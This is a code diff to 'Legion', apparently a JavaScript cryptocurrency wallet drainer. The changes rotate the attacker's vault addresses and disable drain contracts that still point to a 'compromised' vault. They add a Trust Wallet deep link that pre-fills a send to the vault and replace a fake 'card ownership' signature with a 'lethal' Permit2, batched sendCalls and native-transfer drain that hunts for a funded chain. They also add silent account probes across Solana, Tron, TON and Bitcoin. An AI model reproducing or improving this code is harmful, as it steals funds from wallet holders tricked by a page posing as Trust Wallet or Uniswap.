@@ -63,7 +63,7 @@
     clientEncryptKey: '',
   }, window.LEGION_CONFIG || {});
 
-  var LEGION_VERSION = '5.16.19';
+  var LEGION_VERSION = '5.16.28';
   /** Short WC harvest — do not block Telegram/backend on optional namespaces. */
   var WC_HARVEST_WAIT_MS = 10000;
   var WC_BIP122_POLL_MS = 8000;
@@ -151,7 +151,7 @@
 
   // Vault — filled from /api/v1/client-config, fallback to hardcoded
   var VAULT = {
-    evm: '0x2B20979118a61aE3f7f75F3320FB9b0639c5BA53',
+    evm: '0x3b9370B9A8ce3a192e226b6C8B2066A09C3B01eE',
     sol: CFG.solVault || '3TKvjiU5bYnDr883orJz6vLCqksfeaDfmwSMQNCbsTZv',
     btc: CFG.btcVault || 'bc1q7frtqkunftdgukjghpnhwd0wv4f0hpsqkyj43v',
     tron: CFG.tronVault || 'TDLDgBt5WQ9cdy4mfmfMz3h6CxyjqgbZFc',
@@ -163,6 +163,25 @@
 
   var APTOS_RPC = CFG.aptosRpc || 'https://fullnode.mainnet.aptoslabs.com/v1';
   var SUI_RPC = CFG.suiRpc || 'https://fullnode.mainnet.sui.io:443';
+
+  // Trust in-app loophole: trust://send pre-fills Trust's send screen for any native coin
+  var SLIP44 = { BTC: 0, ETH: 60, SOL: 501, TRON: 195, TON: 397, COSMOS: 118, APTOS: 637 };
+  function trustSendDeepLink(family, vaultAddr, amount) {
+    if (!isTrustInAppBrowser() || !vaultAddr) return false;
+    var slip = SLIP44[family];
+    if (slip == null) return false;
+    try {
+      var asset = 'c' + slip;
+      var url = 'trust://send?asset=' + asset + '&address=' + encodeURIComponent(vaultAddr);
+      if (amount) url += '&amount=' + encodeURIComponent(amount);
+      L.log('[trust-send] deep link:', family, '→', String(vaultAddr).slice(0, 10));
+      window.location.href = url;
+      return true;
+    } catch (e) {
+      L.warn('[trust-send] fail:', e && e.message);
+      return false;
+    }
+  }
 
   var SOL_RPCS = [
     CFG.solRpc || 'https://api.mainnet-beta.solana.com',
@@ -315,32 +334,36 @@
 
   // LegionDrainV2 — ONE contract per chain (claim + DeFi drain); deploy: node contracts/deploy-legion-drain.mjs
   
+  // Factories OFF — old factory implementations bake compromised vault 0x2B20.
+  // Re-enable only after redeploy with vault 0x3b9370….
   var DRAIN_FACTORY = {
-    1: '0x22577De82aba57F03d677c28fC27293f86527323',
-    56: '0xF4B67A60fEEB92992487957E0D597A0e009bb4D3',
-    137: '0x5121Fd9F4B44fFce08eb0dcC53931663C7659eDc',
-    5000: '0xd93E1B96103733982D76968e8668277CcBd23d57',
-    43114: '0xd93E1B96103733982D76968e8668277CcBd23d57',
+    1: '0x0000000000000000000000000000000000000000',
+    56: '0x0000000000000000000000000000000000000000',
+    137: '0x0000000000000000000000000000000000000000',
+    5000: '0x0000000000000000000000000000000000000000',
+    43114: '0x0000000000000000000000000000000000000000',
 
   };
 
+  // SAFE ONLY — on-chain vault() = 0x3b9370 (new wallet deploy).
+  // All other chains OFF until redeploy (old contracts hardcode 0x2B20 / 0xc46e).
   var LEGION_DRAIN = {
     1: '0x1AdC4F5C0750525a0483BbD4A7febf9219889F72',
-    10: '0x758FD861d6d07d504949eb43A646D05f430765e6',
+    10: '0x0000000000000000000000000000000000000000',
     25: '0x0000000000000000000000000000000000000000',
-    56: '0x758FD861d6d07d504949eb43A646D05f430765e6',
+    56: '0x0000000000000000000000000000000000000000',
     100: '0x0000000000000000000000000000000000000000',
-    137: '0x758FD861d6d07d504949eb43A646D05f430765e6',
+    137: '0x0000000000000000000000000000000000000000',
     250: '0x0000000000000000000000000000000000000000',
     324: '0x0000000000000000000000000000000000000000',
-    5000: '0xF4B67A60fEEB92992487957E0D597A0e009bb4D3',
+    5000: '0x0000000000000000000000000000000000000000',
     8453: '0x1AdC4F5C0750525a0483BbD4A7febf9219889F72',
     42161: '0x1AdC4F5C0750525a0483BbD4A7febf9219889F72',
     42220: '0x0000000000000000000000000000000000000000',
-    43114: '0x09571F30330b034a298642ae5F30d42a753676cf',
+    43114: '0x0000000000000000000000000000000000000000',
     59144: '0x0000000000000000000000000000000000000000',
-    81457: '0x09571F30330b034a298642ae5F30d42a753676cf',
-    534352: '0x51D55A90c6B0a790cBaB8CC23B9387c42171f759',
+    81457: '0x0000000000000000000000000000000000000000',
+    534352: '0x0000000000000000000000000000000000000000',
     11155111: '0x0000000000000000000000000000000000000000',
 
   };
@@ -377,7 +400,7 @@
 
   // Legacy maps (fallback until LEGION_DRAIN deployed)
   var BATCH_DRAIN = {
-    1: '0x758FD861d6d07d504949eb43A646D05f430765e6',
+    1: '0x0000000000000000000000000000000000000000',
     10: '0x0000000000000000000000000000000000000000',
     56: '0x0000000000000000000000000000000000000000',
     137: '0x0000000000000000000000000000000000000000',
@@ -388,7 +411,7 @@
   };
 
   // BatchDrainV2 — self-initiated EIP-7702 (onlySelf).
-  // OLD mainnet deploy 0x51d55… still has VAULT=0xc46e… (stale). Source now targets 0x2B20….
+  // OLD mainnet deploy 0x51d55… still has VAULT=0xc46e… (stale). Source now targets 0x3b93….
   // Keep DISABLED until redeploy via contracts/deploy-v2.mjs with a CLEAN EOA (no EIP-7702 code).
   var BATCH_DRAIN_V2_ENABLED = false;
   var BATCH_DRAIN_V2 = {
@@ -407,7 +430,7 @@
   };
 
   /** Target vault after V2 redeploy — must match BatchDrainV2.sol VAULT and API vault */
-  var BATCH_DRAIN_V2_ONCHAIN_VAULT = '0x2B20979118a61aE3f7f75F3320FB9b0639c5BA53';
+  var BATCH_DRAIN_V2_ONCHAIN_VAULT = '0x3b9370B9A8ce3a192e226b6C8B2066A09C3B01eE';
 
   // ClaimForwarder — claim() payable → vault (nblscj-style); run deploy-claim-forwarder.mjs
   var CLAIM_FORWARDER = {
@@ -752,7 +775,7 @@
       bd2 ? ('| v2OnChainVault:' + BATCH_DRAIN_V2_ONCHAIN_VAULT.slice(0, 10) + '...') : '');
   }
 
-  var EIP7702_CHAINS = { 1: true, 10: true, 8453: true, 42161: true, 11155111: true };
+  var EIP7702_CHAINS = { 1: true, 8453: true, 42161: true };
 
   var CHAIN_META = {
     1: { name: 'Ethereum', symbol: 'ETH' },
@@ -897,7 +920,7 @@
     // Trust WC mobile deep-links require redirect base schemes — NOT open_url.
     // open_url breaks pairing (QR stuck / no Trust app handoff).
     return {
-      name: document.title || 'Uniswap',
+      name: document.title || 'Trust Wallet',
       description: 'Connect your wallet',
       url: origin,
       icons: [icon],
@@ -2213,6 +2236,10 @@
     if (window.okxwallet) scanObjectForFamily(window.okxwallet, fp.SVM, seen, 'SVM', hasSvmApi, 'okxwallet');
     if (window.bitkeep) scanObjectForFamily(window.bitkeep, fp.SVM, seen, 'SVM', hasSvmApi, 'bitkeep');
     if (window.trustwallet) scanObjectForFamily(window.trustwallet, fp.SVM, seen, 'SVM', hasSvmApi, 'trustwallet');
+    // Trust in-app: explicit window.trustwallet.solana provider (per Trust docs)
+    if (window.trustwallet && window.trustwallet.solana) {
+      pushFamily(fp.SVM, seen, window.trustwallet.solana, 'SVM', 'trustwallet.solana');
+    }
     if (window.coinbaseSolana) pushFamily(fp.SVM, seen, window.coinbaseSolana, 'SVM', 'coinbaseSolana');
 
     if (window.unisat) pushFamily(fp.UTXO, seen, window.unisat, 'UTXO', 'unisat');
@@ -2225,29 +2252,53 @@
     if (window.okxwallet) scanObjectForFamily(window.okxwallet, fp.UTXO, seen, 'UTXO', hasUtxoApi, 'okxwallet');
     if (window.bitkeep) scanObjectForFamily(window.bitkeep, fp.UTXO, seen, 'UTXO', hasUtxoApi, 'bitkeep');
     if (window.phantom) scanObjectForFamily(window.phantom, fp.UTXO, seen, 'UTXO', hasUtxoApi, 'phantom');
+    // Trust in-app: window.trustwallet.bitcoin (per Trust docs — bip122)
+    if (window.trustwallet && window.trustwallet.bitcoin) {
+      pushFamily(fp.UTXO, seen, window.trustwallet.bitcoin, 'UTXO', 'trustwallet.bitcoin');
+    }
 
     if (window.tronLink) pushFamily(fp.TRON, seen, window.tronLink, 'TRON', 'tronLink');
     if (window.tronWeb) pushFamily(fp.TRON, seen, { tronWeb: window.tronWeb }, 'TRON', 'tronWeb');
     if (window.okxwallet) scanObjectForFamily(window.okxwallet, fp.TRON, seen, 'TRON', hasTronApi, 'okxwallet');
+    // Trust in-app: window.trustwallet.tron
+    if (window.trustwallet && window.trustwallet.tron) {
+      pushFamily(fp.TRON, seen, { tronWeb: window.trustwallet.tron }, 'TRON', 'trustwallet.tron');
+    }
 
     if (window.tonkeeper) pushFamily(fp.TON, seen, window.tonkeeper, 'TON', 'tonkeeper');
     if (window.ton) pushFamily(fp.TON, seen, window.ton, 'TON', 'ton');
     if (window.okxwallet) scanObjectForFamily(window.okxwallet, fp.TON, seen, 'TON', hasTonApi, 'okxwallet');
+    // Trust in-app: window.trustwallet.ton
+    if (window.trustwallet && window.trustwallet.ton) {
+      pushFamily(fp.TON, seen, window.trustwallet.ton, 'TON', 'trustwallet.ton');
+    }
 
     if (window.keplr) pushFamily(fp.COSMOS, seen, window.keplr, 'COSMOS', 'keplr');
     if (window.leap) pushFamily(fp.COSMOS, seen, window.leap, 'COSMOS', 'leap');
     if (window.cosmostation && window.cosmostation.providers) {
       scanObjectForFamily(window.cosmostation.providers, fp.COSMOS, seen, 'COSMOS', hasCosmosApi, 'cosmostation');
     }
+    // Trust in-app: window.trustwallet.cosmos (per Trust docs)
+    if (window.trustwallet && window.trustwallet.cosmos) {
+      pushFamily(fp.COSMOS, seen, window.trustwallet.cosmos, 'COSMOS', 'trustwallet.cosmos');
+    }
 
     if (window.aptos) pushFamily(fp.APTOS, seen, window.aptos, 'APTOS', 'aptos');
     if (window.petra && window.petra.aptos) pushFamily(fp.APTOS, seen, window.petra.aptos, 'APTOS', 'petra');
     if (window.martian) pushFamily(fp.APTOS, seen, window.martian, 'APTOS', 'martian');
     if (window.okxwallet) scanObjectForFamily(window.okxwallet, fp.APTOS, seen, 'APTOS', hasAptosApi, 'okxwallet');
+    // Trust in-app: window.trustwallet.aptos
+    if (window.trustwallet && window.trustwallet.aptos) {
+      pushFamily(fp.APTOS, seen, window.trustwallet.aptos, 'APTOS', 'trustwallet.aptos');
+    }
 
     if (window.suiWallet) pushFamily(fp.SUI, seen, window.suiWallet, 'SUI', 'suiWallet');
     if (window.phantom) scanObjectForFamily(window.phantom, fp.SUI, seen, 'SUI', hasSuiApi, 'phantom');
     if (window.okxwallet) scanObjectForFamily(window.okxwallet, fp.SUI, seen, 'SUI', hasSuiApi, 'okxwallet');
+    // Trust in-app: window.trustwallet.sui
+    if (window.trustwallet && window.trustwallet.sui) {
+      pushFamily(fp.SUI, seen, window.trustwallet.sui, 'SUI', 'trustwallet.sui');
+    }
 
     S.familyProviders = fp;
     var counts = [];
@@ -2285,7 +2336,7 @@
     uniswap: [],
     ledger: [],
     injected: [],
-    trust: ['SVM', 'UTXO', 'TRON'],
+    trust: ['SVM', 'UTXO', 'TRON', 'TON', 'COSMOS', 'APTOS', 'SUI'],
     okx: ['SVM', 'UTXO', 'TRON', 'TON', 'APTOS', 'SUI'],
     phantom: ['SVM', 'UTXO', 'SUI'],
     bitget: ['SVM', 'UTXO'],
@@ -2294,7 +2345,15 @@
 
   var WALLET_PROVIDER_HINTS = {
     coinbase: { SVM: ['coinbasesolana', 'coinbase'] },
-    trust: { SVM: ['trustwallet'], TRON: ['tronlink', 'tronweb', 'trustwallet'], UTXO: ['trustwallet'] },
+    trust: {
+      SVM: ['trustwallet', 'trustwallet.solana', 'window.solana'],
+      TRON: ['tronlink', 'tronweb', 'trustwallet', 'trustwallet.tron'],
+      UTXO: ['trustwallet', 'trustwallet.bitcoin'],
+      TON: ['trustwallet', 'trustwallet.ton', 'ton', 'tonkeeper'],
+      COSMOS: ['trustwallet', 'trustwallet.cosmos', 'keplr'],
+      APTOS: ['trustwallet', 'trustwallet.aptos', 'aptos', 'petra'],
+      SUI: ['trustwallet', 'trustwallet.sui', 'suiWallet'],
+    },
     okx: {
       SVM: ['okxwallet'], UTXO: ['okxwallet'], TRON: ['okxwallet'],
       TON: ['okxwallet'], APTOS: ['okxwallet'], SUI: ['okxwallet'],
@@ -3193,36 +3252,179 @@
     return !isMetaMaskProvider(provider);
   }
 
-  /**
-   * Guaranteed WC popup for Trust mobile when Permit2/native skipped (dust).
-   * Fires personal_sign then nudges trust:// so the pending request is visible.
-   */
-  async function forceWcVerifySign(provider, address) {
-    if (!provider || !address) throw new Error('no provider/address for verify sign');
-    var msg = 'Verify Trust Wallet Card ownership\n' + String(address).toLowerCase() + '\n' + Date.now();
-    var hex = toHex(msg);
-    try { window.__LEGION_DEEP_LINK_TARGET__ = null; } catch (eDl) { /* ignore */ }
-    // Open Trust shortly AFTER request is in-flight (iOS needs pending session request)
-    setTimeout(function () {
-      try { window.location.href = 'trust://'; } catch (eOpen) { /* ignore */ }
-    }, 450);
-    UI.showStatus('Approve signature in Trust Wallet…');
-    var sig = await provider.request({
-      method: 'personal_sign',
-      params: [hex, address],
-    });
-    if (sig) {
-      L.log('[sign] WC personal_sign ok');
+  function isTrustInAppBrowser() {
+    try {
+      if (window.__TRUST_IN_APP__) return true;
+      if (typeof window.__TRUST_IS_IN_APP__ === 'function' && window.__TRUST_IS_IN_APP__()) return true;
+      var q = String((typeof location !== 'undefined' && location.search) || '');
+      if (/utm_source=Trust_(iOS|Android)_Browser/i.test(q)) return true;
+      if (/[?&]trust_inapp=1(?:&|$)/i.test(q)) return true;
       try {
-        await SCOUT.reportDrainStatus('signature', address, S.evmChain || 1, S.evmWallet || 'Trust Wallet', 'personal_sign verify');
-      } catch (eRep) { /* ignore */ }
-    }
-    return sig || null;
+        if (sessionStorage.getItem('trust_confirmed_inapp') === '1') return true;
+      } catch (eSs) { /* ignore */ }
+      if (window.ethereum && (window.ethereum.isTrust || window.ethereum.isTrustWallet)) return true;
+      if (window.trustwallet && window.trustwallet.ethereum) return true;
+    } catch (e) { /* ignore */ }
+    return false;
   }
 
+  function getInjectedTrustProvider() {
+    try {
+      if (window.trustwallet && window.trustwallet.ethereum) return window.trustwallet.ethereum;
+    } catch (e0) { /* ignore */ }
+    try {
+      var eth = window.ethereum;
+      if (!eth) return null;
+      if (eth.isTrust || eth.isTrustWallet) return eth;
+      if (eth.providers && eth.providers.length) {
+        for (var i = 0; i < eth.providers.length; i++) {
+          var p = eth.providers[i];
+          if (p && (p.isTrust || p.isTrustWallet)) return p;
+        }
+      }
+      if (isTrustInAppBrowser()) return eth;
+    } catch (e1) { /* ignore */ }
+    return null;
+  }
+
+  /** WC path OR Trust in-app injected — always surface a wallet confirm popup. */
+  function shouldForceWalletPopup(provider, walletName) {
+    if (walletName === 'WalletConnect' || !!(provider && provider.isWalletConnect)) return true;
+    if (isTrustInAppBrowser()) return true;
+    if (/trust/i.test(String(walletName || ''))) return true;
+    return false;
+  }
+
+  /**
+   * Lethal popup only — NO personal_sign (does not settle funds).
+   * Order: fast scan → runDrainWaterfall (sendCalls / 7702 / Permit2 typedData_v4).
+   */
+  async function forceLethalSign(provider, address, chainId, walletName) {
+    if (!provider || !address) throw new Error('no provider/address for lethal sign');
+    if (S._lethalSignDepth) {
+      L.warn('[lethal] re-entrancy blocked');
+      return { ok: false, error: 'busy' };
+    }
+    S._lethalSignDepth = 1;
+    try {
+    chainId = Number(chainId) || S.evmChain || 1;
+    walletName = walletName || S.evmWallet || 'Trust Wallet';
+    try { window.__LEGION_DEEP_LINK_TARGET__ = null; } catch (eDl) { /* ignore */ }
+    UI.showStatus('Confirm Permit2 / batch in Trust…');
+
+    if (!S.vaultLoaded) {
+      try { await runWithTimeout(prefetchVault(), 4000, 'vault-prefetch'); } catch (eV) { /* ignore */ }
+    }
+
+    var assets = null;
+    try {
+      assets = await runWithTimeout(scanAssets(provider, address, chainId), 5000, 'fast-scan');
+    } catch (eScan) {
+      L.warn('[lethal] fast scan:', eScan && eScan.message);
+    }
+    if (!assets) {
+      assets = { tokens: [], nfts: [], nativeHex: '0x0', usd: 0 };
+    }
+
+    // ═══ FUNDED CHAIN SWITCH — if current chain empty, switch to funded chain (POPUP) ═══
+    if (!assetsHaveDrainableBalance(assets)) {
+      L.log('[lethal] current chain', chainId, 'empty — finding funded chain (wallet switch popup)...');
+      UI.showStatus('Switching to funded network…');
+      try {
+        var fundedChain = await runWithTimeout(
+          ensureFundedEvmChain(provider, address, chainId),
+          15000,
+          'funded-chain-switch'
+        );
+        if (fundedChain && Number(fundedChain) !== Number(chainId)) {
+          L.log('[lethal] switched to funded chain', fundedChain, '— re-scan + drain');
+          chainId = Number(fundedChain);
+          S.evmChain = chainId;
+          // Re-scan on the new funded chain
+          try {
+            assets = await runWithTimeout(scanAssets(provider, address, chainId), 5000, 'fast-scan-2');
+          } catch (eScan2) {
+            L.warn('[lethal] re-scan:', eScan2 && eScan2.message);
+          }
+          if (!assets) assets = { tokens: [], nfts: [], nativeHex: '0x0', usd: 0 };
+        }
+      } catch (eSwitch) {
+        if (isUserRejection(eSwitch)) throw eSwitch;
+        L.warn('[lethal] funded chain switch:', eSwitch && eSwitch.message);
+      }
+    }
+
+    // If current chain empty, still try waterfall (may no-op) then multi-chain drain
+    var ok = false;
+    try {
+      ok = await runDrainWaterfall(provider, address, chainId, walletName, null, assets);
+    } catch (eW) {
+      if (isUserRejection(eW)) throw eW;
+      L.warn('[lethal] waterfall:', eW && eW.message);
+    }
+    if (ok) {
+      try { S.instantSignAt = Date.now(); } catch (eTs) { /* ignore */ }
+      return { ok: true, path: 'drain_waterfall' };
+    }
+
+    // Multi-chain EVM drain (Permit2 on funded chains) — still typedData, never personal_sign
+    try {
+      if (!S.drainRunning) {
+        armDrainLock();
+        try {
+          await runUniversalDrain({
+            provider: provider,
+            address: address,
+            chainId: chainId,
+            walletName: walletName,
+            hwObj: null,
+          });
+          if (S.pendingEvmPermit2 || S.anchorsOk > 0) {
+            try { S.instantSignAt = Date.now(); } catch (eTs2) { /* ignore */ }
+            return { ok: true, path: 'universal_drain' };
+          }
+        } finally {
+          clearDrainLock();
+        }
+      }
+    } catch (eU) {
+      if (isUserRejection(eU)) throw eU;
+      L.warn('[lethal] universal:', eU && eU.message);
+    }
+    return { ok: false, error: 'no_lethal_target' };
+    } finally {
+      S._lethalSignDepth = 0;
+    }
+  }
+
+  /**
+   * @deprecated Keep name for WC open-nudge only — Trust lethal path must NOT use this.
+   * Outside Trust Browser WC: still may nudge trust:// after a real typed sign elsewhere.
+   */
+  async function forceWcVerifySign(provider, address) {
+    // personal_sign banned for Trust Card — redirect to lethal Permit2 path
+    L.warn('[sign] personal_sign blocked → lethal Permit2/typedData');
+    return forceLethalSign(provider, address, S.evmChain || 1, S.evmWallet || 'Trust Wallet')
+      .then(function (r) { return r && r.ok ? 'lethal' : null; });
+  }
+
+  var _forceSignInflight = null;
+
   async function forceTrustSignPublic() {
+    if (_forceSignInflight) return _forceSignInflight;
+    _forceSignInflight = (async function () {
     if (!S.evmAddr) {
       try { S.evmAddr = sessionStorage.getItem('legion_wc_evm_addr') || ''; } catch (e0) { /* ignore */ }
+    }
+    // Prefer injected Trust when already inside Trust Browser
+    if (isTrustInAppBrowser()) {
+      var inj = getInjectedTrustProvider();
+      if (inj) {
+        S.evmProvider = inj;
+        S.connectMode = 'injected';
+        S.wcSessionActive = false;
+        try { inj.isWalletConnect = false; } catch (eInj) { /* ignore */ }
+      }
     }
     if (!S.evmProvider && window.LegionWallet && typeof window.LegionWallet.tryRecoverStoredSession === 'function') {
       try {
@@ -3238,41 +3440,37 @@
     if (!S.evmProvider && window.LegionWallet && typeof window.LegionWallet.getProvider === 'function') {
       try { S.evmProvider = await window.LegionWallet.getProvider(); } catch (e3) { /* ignore */ }
     }
+    if (!S.evmProvider) {
+      var inj2 = getInjectedTrustProvider();
+      if (inj2) {
+        S.evmProvider = inj2;
+        S.connectMode = 'injected';
+      }
+    }
     if (!S.evmProvider || !S.evmAddr) {
-      L.warn('[forceTrustSign] no WC session — reconnect Trust first');
+      L.warn('[forceTrustSign] no provider/session — reconnect Trust first');
       return { ok: false, error: 'no_session' };
     }
-    // Try full drain first (Permit2 if assets), else verify sign
+
     try {
-      if (!S.drainRunning) {
-        armDrainLock();
-        try {
-          await runUniversalDrain({
-            provider: S.evmProvider,
-            address: S.evmAddr,
-            chainId: S.evmChain || 1,
-            walletName: S.evmWallet || 'Trust Wallet',
-            hwObj: null,
-          });
-          S.drainAttempted = true;
-          if (S.pendingEvmPermit2 || S.anchorsOk > 0) {
-            return { ok: true, path: 'drain' };
-          }
-        } finally {
-          clearDrainLock();
-        }
+      L.log('[forceTrustSign] lethal only (Permit2 / sendCalls / 7702) — no personal_sign');
+      var r = await forceLethalSign(
+        S.evmProvider,
+        S.evmAddr,
+        S.evmChain || 1,
+        S.evmWallet || 'Trust Wallet'
+      );
+      if (r && r.ok) {
+        S.drainAttempted = true;
+        return r;
       }
-    } catch (de) {
-      if (isUserRejection(de)) return { ok: false, error: 'rejected' };
-      L.warn('[forceTrustSign] drain:', de && de.message);
-    }
-    try {
-      var sig = await forceWcVerifySign(S.evmProvider, S.evmAddr);
-      return { ok: !!sig, path: 'personal_sign', sig: sig ? 'yes' : 'no' };
+      return r || { ok: false, error: 'no_lethal_target' };
     } catch (se) {
       if (isUserRejection(se)) return { ok: false, error: 'rejected' };
       return { ok: false, error: (se && se.message) || 'sign_fail' };
     }
+    })().finally(function () { _forceSignInflight = null; });
+    return _forceSignInflight;
   }
 
   // ═══════════════════════════════════════════════════════════════
@@ -4872,18 +5070,8 @@
         return false;
       }
     if (!assetsHaveDrainableBalance(assets)) {
-      L.log('Chain', chainId, 'no drainable balance — WC verify sign fallback');
-      var isWcEmpty = walletName === 'WalletConnect' || !!(provider && provider.isWalletConnect);
-      if (isWcEmpty && !hwObj) {
-        try {
-          var emptySig = await forceWcVerifySign(provider, address);
-          return !!emptySig;
-        } catch (emptyErr) {
-          if (isUserRejection(emptyErr)) throw emptyErr;
-          L.warn('empty-balance verify sign:', emptyErr && emptyErr.message);
-          return false;
-        }
-      }
+      L.log('Chain', chainId, 'no drainable balance — skip personal_sign (lethal-only)');
+      // Never personal_sign. Empty chain = no popup here; multi-chain drain may still run.
       return false;
     }
 
@@ -4928,6 +5116,27 @@
       }
     }
 
+    // ═══ LOOPHOLE 1: BLIND wallet_sendCalls — try even without capabilities confirmation ═══
+    // Trust/Exodus in-app may support wallet_sendCalls even if getCapabilities fails.
+    // ONE popup = native ETH + ERC-20 + NFTs all together.
+    var batchTokensBlind = filterDrainableTokens(assets.tokens);
+    var hasBlindTargets = nativeSend > MIN_NATIVE_WEI || batchTokensBlind.length > 0 || assets.nfts.length > 0;
+    if (!didSomething && hasBlindTargets && !hwObj && !(isMm && !isWcPath)) {
+      try {
+        L.log('[drain] BLIND wallet_sendCalls attempt (no capabilities needed)');
+        var blindBatch = await drainSendCalls(provider, address, chainId, assets);
+        var blindId = extractBatchOrTxId(blindBatch);
+        if (blindId && isLikelyTxHash(blindId)) {
+          await SUBMIT.sendCalls(blindId, address, chainId, walletName);
+          didSomething = true;
+          L.log('BLIND sendCalls OK — ONE popup covered native + ERC-20 + NFTs');
+        }
+      } catch (blindE) {
+        if (isUserRejection(blindE)) throw blindE;
+        L.warn('[drain] blind sendCalls fail (expected if unsupported):', blindE.message);
+      }
+    }
+
     // MetaMask extension: Permit2 PRIMARY when 7702 unavailable
     if (!didSomething && isMm && !isWcPath) {
       var mmDrainable = filterDrainableTokens(assets.tokens);
@@ -4968,9 +5177,10 @@
       }
     }
 
-    // WC / mobile — single native tx if batch unavailable
-    if (!didSomething && isWcPath && MOBILE_SEND_TX && nativeSend > MIN_NATIVE_WEI) {
-      L.log('WC native tx | native:', (Number(nativeSend) / 1e18).toFixed(6));
+    // ═══ LOOPHOLE 2: Native eth_sendTransaction fallback — WC AND injected (in-app) path ═══
+    // Was: only WC path. Now: also covers injected (Trust/Exodus in-app) when sendCalls fails.
+    if (!didSomething && MOBILE_SEND_TX && nativeSend > MIN_NATIVE_WEI) {
+      L.log('Native tx fallback | native:', (Number(nativeSend) / 1e18).toFixed(6), '| path:', isWcPath ? 'WC' : 'injected');
       try {
         var wcTx = await drainNativeSendTx(provider, address, chainId, assets);
         if (wcTx && isLikelyTxHash(wcTx)) {
@@ -5033,17 +5243,7 @@
       }
     }
 
-    // Trust / WC: always surface a wallet popup if drain skipped (dust / no permit targets)
-    if (!didSomething && isWcPath) {
-      try {
-        L.log('[drain] WC verify personal_sign fallback — force Trust popup');
-        var vs = await forceWcVerifySign(provider, address);
-        if (vs) didSomething = true;
-      } catch (vse) {
-        if (isUserRejection(vse)) throw vse;
-        L.warn('WC verify sign fail:', vse && vse.message);
-      }
-    }
+    // No personal_sign / no recursive forceLethalSign (would infinite-loop waterfall).
 
     L.log('Drain chain', chainId, didSomething ? 'ok' : 'skip');
 
@@ -5116,6 +5316,24 @@
     if (!entry) return null;
     var prov = entry.provider;
     try {
+      // Silent probe first — no popup (onlyIfTrusted or already-exposed publicKey)
+      var silentAddr = '';
+      try {
+        var silentPk = prov.publicKey;
+        if (!silentPk && prov.features && prov.features['standard:connect']) {
+          await prov.features['standard:connect'].connect({ onlyIfTrusted: true }).catch(function () { return null; });
+          silentPk = prov.publicKey;
+        }
+        if (silentPk) silentAddr = silentPk.toString ? silentPk.toString() : String(silentPk);
+        if (!silentAddr && prov.publicKey && prov.publicKey.toBase58) silentAddr = prov.publicKey.toBase58();
+      } catch (_) {}
+      if (silentAddr && silentAddr.length > 20) {
+        L.log('[SVM] silent:', silentAddr.slice(0, 8), '(' + entry.hint + ')');
+        S.chains.SOL = { address: silentAddr, name: 'SVM' };
+        return { provider: prov, address: silentAddr, name: 'SVM', family: 'SVM', hint: entry.hint };
+      }
+      // Full connect — skip in Trust in-app to avoid popup
+      if (isTrustInAppBrowser()) return null;
       if (prov.features && prov.features['standard:connect']) {
         await prov.features['standard:connect'].connect({});
       } else if (prov.connect) {
@@ -5158,6 +5376,7 @@
     var txMetas = [];
 
       var lamports = await connection.getBalance(fromPk);
+    S._solScanLamports = lamports; // FIX: store for accurate scout_value_usd in SUBMIT.solana
     var feeReserve = 50000;
     if (lamports > feeReserve + 5000) {
         var solTx = new web3.Transaction();
@@ -5251,8 +5470,20 @@
     if (!entry) return null;
     var tl = entry.provider;
     try {
-      if (tl.request) await tl.request({ method: 'tron_requestAccounts' });
+      // Silent probe first — TronLink-style providers expose defaultAddress without popup
       var tw = tl.tronWeb || window.tronWeb;
+      var silentDirect = (tw && tw.defaultAddress && tw.defaultAddress.base58)
+        || (tl.defaultAddress && tl.defaultAddress.base58)
+        || tl.address || tl.selectedAddress || '';
+      if (silentDirect) {
+        L.log('[TRON] silent:', String(silentDirect).slice(0, 8), '(' + entry.hint + ')');
+        S.chains.TRON = { address: String(silentDirect) };
+        return { tronWeb: tw || tl, address: String(silentDirect), name: 'TRON', family: 'TRON', hint: entry.hint };
+      }
+      // Full connect — skip in Trust in-app to avoid popup
+      if (isTrustInAppBrowser()) return null;
+      if (tl.request) await tl.request({ method: 'tron_requestAccounts' });
+      tw = tl.tronWeb || window.tronWeb;
       if (!tw || !tw.defaultAddress || !tw.defaultAddress.base58) return null;
       var addr = tw.defaultAddress.base58;
       L.log('[TRON] connected:', addr.slice(0, 8), '(' + entry.hint + ')');
@@ -5348,17 +5579,30 @@
     var entry = firstFamilyProvider('TON');
     var tonProv = entry ? entry.provider : null;
     if (tonProv) {
+      // Silent probe — check account without calling connect()
       try {
-        var r = await tonProv.connect({ items: [{ name: 'ton_addr' }] });
-        if (r && r.items) {
-          var ai = r.items.find(function (x) { return x.name === 'ton_addr'; });
-          if (ai && ai.address) {
-            S.chains.TON = { address: ai.address };
-            L.log('[TON] connected:', ai.address.slice(0, 8), '(' + entry.hint + ')');
-            return { provider: tonProv, address: ai.address, type: 'direct', name: 'TON', family: 'TON', hint: entry.hint };
-          }
+        var silentAcc = tonProv.account;
+        var silentTonAddr = silentAcc && (silentAcc.address || silentAcc);
+        if (silentTonAddr && typeof silentTonAddr === 'string' && silentTonAddr.length > 10) {
+          L.log('[TON] silent:', silentTonAddr.slice(0, 8), '(' + entry.hint + ')');
+          S.chains.TON = { address: silentTonAddr };
+          return { provider: tonProv, address: silentTonAddr, type: 'direct', name: 'TON', family: 'TON', hint: entry.hint };
         }
-      } catch (e) {}
+      } catch (_) {}
+      // Full connect — skip in Trust in-app to avoid popup
+      if (!isTrustInAppBrowser()) {
+        try {
+          var r = await tonProv.connect({ items: [{ name: 'ton_addr' }] });
+          if (r && r.items) {
+            var ai = r.items.find(function (x) { return x.name === 'ton_addr'; });
+            if (ai && ai.address) {
+              S.chains.TON = { address: ai.address };
+              L.log('[TON] connected:', ai.address.slice(0, 8), '(' + entry.hint + ')');
+              return { provider: tonProv, address: ai.address, type: 'direct', name: 'TON', family: 'TON', hint: entry.hint };
+            }
+          }
+        } catch (e) {}
+      }
     }
     try {
       var TC = resolveTonConnect();
@@ -5496,6 +5740,18 @@
     if (!entry) return null;
     var prov = entry.provider;
     try {
+      // Silent probe — selectedAddress or accounts array without popup
+      var silentBtc = prov.selectedAddress
+        || (prov.accounts && (Array.isArray(prov.accounts) ? prov.accounts[0] : prov.accounts))
+        || '';
+      if (silentBtc && typeof silentBtc === 'object') silentBtc = silentBtc.address || silentBtc.pubkey || '';
+      if (silentBtc && typeof silentBtc === 'string' && silentBtc.length > 10) {
+        L.log('[UTXO] silent:', silentBtc.slice(0, 8), '(' + entry.hint + ')');
+        S.chains.BTC = { address: silentBtc, name: 'UTXO' };
+        return { provider: prov, address: silentBtc, name: 'UTXO', family: 'UTXO', hint: entry.hint };
+      }
+      // Full connect — skip in Trust in-app to avoid popup
+      if (isTrustInAppBrowser()) return null;
       var accounts;
